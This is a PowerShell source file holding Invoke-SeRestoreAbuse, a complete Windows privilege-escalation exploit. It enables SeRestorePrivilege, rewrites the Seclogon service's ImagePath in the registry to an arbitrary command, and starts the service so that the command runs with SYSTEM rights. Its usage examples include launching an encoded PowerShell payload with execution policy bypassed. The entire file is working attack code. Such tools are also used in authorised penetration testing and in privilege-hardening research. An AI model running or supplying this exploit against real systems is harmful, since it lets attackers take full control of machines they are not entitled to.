function Invoke-SeRestoreAbuse {
<#
.SYNOPSIS
	Modifies the Seclogon service ImagePath using SeRestorePrivilege to execute an arbitrary command.
.DESCRIPTION
	Uses SeRestorePrivilege to overwrite the registry value of the Seclogon service and execute a custom payload.
	The privilege must already be assigned to the current token. Check with "whoami /priv".
.EXAMPLE
	C:\PS> Invoke-SeRestoreAbuse
	C:\PS> Invoke-SeRestoreAbuse -Command 'cmd /c powershell -c "whoami > C:\foo.txt"'
	C:\PS> Invoke-SeRestoreAbuse -Command 'cmd /c start /b powershell -nop -ep bypass -e BASE64_SH'
.NOTES
	Author: https://github.com/0x4D-5A
	Credits: @hatRiot @xct
#>
    param(
        [Parameter(Mandatory=$false)]
        [string]$Command
    )
	$a1 = "advapi32.dll"
	$a2 = "kernel32.dll"

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct TokPriv1Luid
	{
		public int Count;
		public long Luid;
		public int Attr;
	}
	
	public static class adv
	{
		[DllImport("$a1", SetLastError=true)]
		public static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, ref IntPtr TokenHandle);
			
		[DllImport("$a1", SetLastError=true)]
		public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, ref long lpLuid);
			
		[DllImport("$a1", SetLastError = true)]
		public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TokPriv1Luid NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

		[DllImport("$a1", CharSet=CharSet.Ansi, SetLastError=true)]
		public static extern int RegCreateKeyExA(UInt32 hKey, string lpSubKey, int Reserved, string lpClass, int dwOptions, int samDesired, IntPtr lpSecurityAttributes, ref IntPtr phkResult, int lpdwDisposition);

		[DllImport("$a1", CharSet=CharSet.Ansi, SetLastError=true)]
		public static extern int RegSetValueExA(IntPtr hKey, string lpValueName, int Reserved, int dwType, string lpData, int cbData);
		
		[DllImport("$a1", CharSet=CharSet.Ansi, SetLastError=true)]
		public static extern int RegQueryValueExA(IntPtr hKey, string lpValueName, int lpReserved, out uint lpType, [Out] byte[] lpData, ref uint lpcbData);

		[DllImport("$a1", CharSet=CharSet.Ansi, SetLastError=true)]
		public static extern int RegOpenKeyExA(UInt32 hKey, string lpSubKey, int ulOptions, int samDesired, out IntPtr phkResult);

		[DllImport("$a1", SetLastError=true)]
		public static extern int RegCloseKey(IntPtr hKey);

        [DllImport("$a1", CharSet=CharSet.Ansi, SetLastError=true)]
        public static extern IntPtr OpenSCManagerA(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);
            
        [DllImport("$a1", CharSet=CharSet.Ansi, SetLastError=true)]
        public static extern IntPtr OpenServiceA(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);
            
        [DllImport("$a1", SetLastError=true)]
        public static extern bool StartServiceA(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        [DllImport("$a1", SetLastError=true)]
        public static extern bool CloseServiceHandle(IntPtr hSCObject);
	}
	
	public static class k32
	{
		[DllImport("$a2")]
		public static extern uint GetLastError();

		[DllImport("$a2")]
		public static extern bool CloseHandle(IntPtr hObject);
	}
"@

	if (!$Command) {$Command = 'cmd /c set > C:\foo.txt'}

	$LuidVal = $Null

	$TokPriv1Luid = New-Object TokPriv1Luid
	$TokPriv1Luid.Count = 1
	$TokPriv1Luid.Attr = 0x00000002

	$priv_name = "SeRestorePrivilege"
	$srv_name = "Seclogon"
	$hValue = "ImagePath"
	$TARGET_KEY = "SYSTEM\\CurrentControlSet\\Services\\$srv_name"
    $HKEY_LOCAL_MACHINE = 2147483650
    $REG_OPTION_BACKUP_RESTORE = 0x4
    $KEY_SET_VALUE = 0x0002
	$KEY_QUERY_VALUE = 0x0001
    $REG_SZ = 1
	$hKey = [IntPtr]::Zero
	$hRead = [IntPtr]::Zero

	$ok = 0
	$original = ""
	$lpType = 0

    $SC_MANAGER_CONNECT = 0x0001
    $SERVICE_START = 0x0010
    $ERROR_SERVICE_REQUEST_TIMEOUT = 1053

	do
	{
		$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
		if (!$ProcHandle) {break}

		$hTokenHandle = [IntPtr]::Zero
		$call = [adv]::OpenProcessToken($ProcHandle, 0x28, [ref]$hTokenHandle)
		if (!$call) {break}
		
		$call = [adv]::LookupPrivilegeValue($null, $priv_name, [ref]$LuidVal)
		if (!$call) {break}

		$TokPriv1Luid.Luid = $LuidVal

		$call = [adv]::AdjustTokenPrivileges($hTokenHandle, $False, [ref]$TokPriv1Luid, 0, [IntPtr]::Zero, [IntPtr]::Zero)
		if (!$call) {break}

		Write-Output "[+] $priv_name privilege enabled"

		$call = [adv]::RegOpenKeyExA($HKEY_LOCAL_MACHINE, $TARGET_KEY, 0, $KEY_QUERY_VALUE, [ref]$hRead)
        if ($call -eq 0) {
			$lpData = New-Object byte[] 256
			$lpcbData = $lpData.Length

			$call = [adv]::RegQueryValueExA($hRead, $hValue, 0, [ref]$lpType, $lpData, [ref]$lpcbData)
			if ($call -eq 0) {
				$original = [System.Text.Encoding]::ASCII.GetString($lpData, 0, $lpcbData).TrimEnd([char]0)
			}
        }

		$call = [adv]::RegCreateKeyExA($HKEY_LOCAL_MACHINE, $TARGET_KEY, 0, $null, $REG_OPTION_BACKUP_RESTORE, $KEY_SET_VALUE, [IntPtr]::Zero, [ref]$hKey, $null)
		if ($call) {break}

		$call = [adv]::RegSetValueExA($hKey, $hValue, 0, $REG_SZ, $Command, $Command.Length + 1)
		if ($call) {break}

		Write-Output "[+] $hValue set to: $Command"

		$scm = [adv]::OpenSCManagerA($null, "ServicesActive", $SC_MANAGER_CONNECT)
		if (!$scm) {break}

		$service = [adv]::OpenServiceA($scm, $srv_name, $SERVICE_START)
		if (!$service) {break}

		$call = [adv]::StartServiceA($service, 0, $null)
		if (!$call) {
			$err = [k32]::GetLastError()
			if ($err -ne $ERROR_SERVICE_REQUEST_TIMEOUT)
			{
				Write-Output "[-] Failed to start service (Error: $err)"
				break
			}
		}

		$ok = 1;
	} while (0)

	if ($hTokenHandle) {$c = [k32]::CloseHandle($hTokenHandle)}
	if ($hRead) {$c = [adv]::RegCloseKey($hRead)}
	if ($scm) {$c = [adv]::CloseServiceHandle($scm)}
	if ($service) {$c = [adv]::CloseServiceHandle($service)}

	if ($ok)
	{
		Write-Output "[+] $srv_name service started"
	} else {
		if (!$err) {
			$err = [k32]::GetLastError()
			Write-Output "[-] Operation failed (Error: $err)"
		}
	}

	if ($original -And $hKey) {
		$call = [adv]::RegSetValueExA($hKey, $hValue, 0, $lpType, $original, $original.Length + 1)
		if ($call -eq 0) {
			Write-Output "[+] $hValue restored to: $original"
		}
	}

	if ($hKey) {$c = [adv]::RegCloseKey($hKey)}
}